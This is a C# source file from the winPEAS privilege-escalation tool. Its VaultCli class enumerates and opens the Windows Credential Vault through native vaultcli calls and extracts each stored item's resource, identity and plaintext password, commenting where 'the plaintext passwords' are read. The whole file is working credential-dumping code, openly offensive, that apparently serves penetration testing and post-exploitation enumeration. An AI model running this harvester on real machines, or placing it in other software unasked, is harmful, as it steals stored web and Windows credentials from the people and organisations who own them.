using System;
using System.Collections.Generic;
using System.Reflection;
using winPEAS.Helpers;
using winPEAS.KnownFileCreds.Vault.Structs;
using VaultCliNative = winPEAS.Native.Vaultcli;

namespace winPEAS.KnownFileCreds.Vault
{
    public static class VaultCli
    {
        public static List<Dictionary<string, string>> DumpVault()
        {
            List<Dictionary<string, string>> results = new List<Dictionary<string, string>>();

            try
            {
                // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
                var OSVersion = Environment.OSVersion.Version;
                var OSMajor = OSVersion.Major;
                var OSMinor = OSVersion.Minor;

                Type VAULT_ITEM;

                if (OSMajor >= 6 && OSMinor >= 2)
                {
                    VAULT_ITEM = typeof(VAULT_ITEM_WIN8);
                }
                else
                {
                    VAULT_ITEM = typeof(VAULT_ITEM_WIN7);
                }

                Int32 vaultCount = 0;
                IntPtr vaultGuidPtr = IntPtr.Zero;
                var result = VaultCliNative.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);

                //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);

                if ((int)result != 0)
                {
                    Console.WriteLine("  [ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
                    return results;
                }

                // Create dictionary to translate Guids to human readable elements
                IntPtr guidAddress = vaultGuidPtr;
                Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>
                {
                    { new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note" },
                    { new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential" },
                    { new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector" },
                    { new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials" },
                    { new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials" },
                    { new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential" },
                    { new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential" },
                    { new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential" },
                    { new Guid("00000000-0000-0000-0000-000000000000"), null }
                };

                for (int i = 0; i < vaultCount; i++)
                {

                    // Open vault block
                    object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));
                    Guid vaultGuid = new Guid(vaultGuidString.ToString());
                    guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));
                    IntPtr vaultHandle = IntPtr.Zero;
                    string vaultType;
                    if (vaultSchema.ContainsKey(vaultGuid))
                    {
                        vaultType = vaultSchema[vaultGuid];
                    }
                    else
                    {
                        vaultType = vaultGuid.ToString();
                    }
                    result = VaultCliNative.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);
                    if (result != 0)
                    {
                        Console.WriteLine("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
                        continue;
                    }
                    // Vault opened successfully! Continue.

                    // Fetch all items within Vault
                    int vaultItemCount = 0;
                    IntPtr vaultItemPtr = IntPtr.Zero;
                    result = VaultCliNative.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
                    if (result != 0)
                    {
                        Console.WriteLine("Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
                        continue;
                    }
                    var structAddress = vaultItemPtr;
                    if (vaultItemCount > 0)
                    {
                        // For each vault item...
                        for (int j = 1; j <= vaultItemCount; j++)
                        {
                            Dictionary<string, string> vault_cred = new Dictionary<string, string>() {
                            { "GUID", string.Format("{0}", vaultGuid) },
                            { "Type", vaultType },
                            { "Resource", "" },
                            { "Identity", "" },
                            { "PacakgeSid", "" },
                            { "Credential", "" },
                            { "Last Modified", "" },
                            { "Error", "" }
                        };

                            // Begin fetching vault item...
                            var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);
                            structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));

                            IntPtr passwordVaultItem = IntPtr.Zero;
                            // Field Info retrieval
                            FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
                            Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
                            FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
                            IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
                            FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
                            IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
                            FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                            UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);

                            IntPtr pPackageSid = IntPtr.Zero;
                            if (OSMajor >= 6 && OSMinor >= 2)
                            {
                                // Newer versions have package sid
                                FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                                pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
                                result = VaultCliNative.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
                            }
                            else
                            {
                                result = VaultCliNative.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
                            }

                            if (result != 0)
                            {
                                vault_cred["Error"] = "Occured while retrieving vault item. Error: 0x" + result.ToString();
                                continue;
                            }
                            object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                            FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                            IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                            // Fetch the credential from the authenticator element
                            object cred = GetVaultElementValue(pAuthenticatorElement);
                            object packageSid = null;
                            if (pPackageSid != IntPtr.Zero && pPackageSid != null)
                            {
                                packageSid = GetVaultElementValue(pPackageSid);
                            }
                            if (cred != null) // Indicates successful fetch
                            {
                                object resource = GetVaultElementValue(pResourceElement);
                                if (resource != null)
                                {
                                    vault_cred["Resource"] = string.Format("{0}", resource);
                                }
                                object identity = GetVaultElementValue(pIdentityElement);
                                if (identity != null)
                                {
                                    vault_cred["Identity"] = string.Format("{0}", identity);
                                }
                                if (packageSid != null)
                                {
                                    vault_cred["PacakgeSid"] = string.Format("{0}", packageSid);
                                }
                                vault_cred["Credential"] = string.Format("{0}", cred);
                                vault_cred["Last Modified"] = string.Format("{0}", DateTime.FromFileTimeUtc((long)lastModified));
                                results.Add(vault_cred);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
            return results;
        }

        private static object GetVaultElementValue(IntPtr vaultElementPtr)
        {
            // Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct
            // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
            object results;
            object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VAULT_ITEM_ELEMENT));
            FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
            var partialElementType = partialElementInfo.GetValue(partialElement);

            IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
            switch ((int)partialElementType)
            {
                case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
                    IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                    results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);
                    break;
                case 0: // VAULT_ELEMENT_TYPE == bool
                    results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);
                    results = (bool)results;
                    break;
                case 1: // VAULT_ELEMENT_TYPE == Short
                    results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                    break;
                case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                    results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                    break;
                case 3: // VAULT_ELEMENT_TYPE == Int
                    results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                    break;
                case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                    results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                    break;
                case 5: // VAULT_ELEMENT_TYPE == Double
                    results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));
                    break;
                case 6: // VAULT_ELEMENT_TYPE == GUID
                    results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));
                    break;
                case 12: // VAULT_ELEMENT_TYPE == Sid
                    IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                    var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                    results = sidObject.Value;
                    break;
                default:
                    /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
                     * Lord Graeber. Thus we do not implement them. */
                    results = null;
                    break;
            }
            return results;
        }
    }
}
